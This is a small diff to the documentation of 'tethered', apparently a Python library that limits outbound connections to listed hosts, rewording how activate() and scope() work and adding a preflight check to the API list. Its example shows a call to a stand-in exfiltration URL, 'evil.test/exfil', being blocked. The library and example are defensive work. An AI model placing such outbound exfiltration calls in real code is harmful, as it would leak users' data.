@@ -30,7 +30,7 @@ urllib.request.urlopen("https://api.stripe.com/v1/charges")  # allowed: matches 
 urllib.request.urlopen("https://evil.test/exfil")            # raises tethered.EgressBlocked
 ```
 
-Your code, your dependencies and AI-generated code share one Python process, and any of them can open an outbound connection you never intended. `activate()` holds the whole process to the hosts you listed; `scope()` narrows a single code path further.
+Your code, your dependencies and AI-generated code share one Python process, and any of them can open an outbound connection you never intended. `activate()` sets the ceiling for the whole process; `scope()` narrows a single code path.
 
 <div class="grid cards" markdown>
 
@@ -44,7 +44,7 @@ Your code, your dependencies and AI-generated code share one Python process, and
 
 - **[API reference](API.md)**
 
-    `activate`, `scope`, `deactivate`, the exceptions and the allow list syntax.
+    `activate`, `scope`, `deactivate`, the exceptions, the allow list syntax and the preflight check.
 
 - **[Compatibility](COMPATIBILITY.md)**
 
